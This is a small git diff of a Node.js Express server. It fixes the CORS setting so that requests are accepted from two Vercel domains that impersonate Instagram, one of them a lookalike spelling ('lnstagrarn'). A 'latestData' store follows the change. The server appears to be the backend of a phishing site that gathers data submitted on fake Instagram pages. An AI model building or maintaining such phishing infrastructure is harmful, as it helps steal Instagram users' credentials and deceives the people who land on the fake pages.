@@ -4,10 +4,11 @@ const cors = require("cors");
 const app = express();
 
 app.use(cors({
-    origin: "https://account-instagram-com.vercel.app",
-            "https://lnstagrarn-reel-paoa2oajo.vercel.app/profile/aryan.gg_xd/geturl$=Instagram/aashyyapsalotigsh=cncyaW43bXdlZXB4/profile.html"
+    origin: [
+        "https://account-instagram-com.vercel.app",
+        "https://lnstagrarn-reel-paoa2oajo.vercel.app"
+    ]
 }));
-
 app.use(express.json());
 
 let latestData = {
